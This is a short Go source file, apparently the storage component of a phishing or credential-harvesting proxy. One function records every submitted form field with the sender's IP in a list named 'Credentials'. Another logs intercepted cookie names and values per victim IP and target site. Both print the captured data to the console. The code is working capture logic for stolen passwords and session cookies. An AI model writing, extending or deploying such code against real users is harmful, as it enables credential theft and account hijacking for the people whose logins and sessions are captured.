package storage

import (
	"fmt"
	"net/http"
)

var (
	Credentials = make([]string, 0)
	Cookies     = make([]string, 0)
)

func SavePostData(r *http.Request) {
	r.ParseForm()
	for key, values := range r.Form {
		for _, v := range values {
			log := fmt.Sprintf("[%s] %s = %s", r.RemoteAddr, key, v)
			Credentials = append(Credentials, log)
			fmt.Println(log)
		}
	}
}

func SaveCookie(ip, target string, c *http.Cookie) {
	log := fmt.Sprintf("[%s] [%s] %s=%s", ip, target, c.Name, c.Value)
	Cookies = append(Cookies, log)
	fmt.Println(log)
}
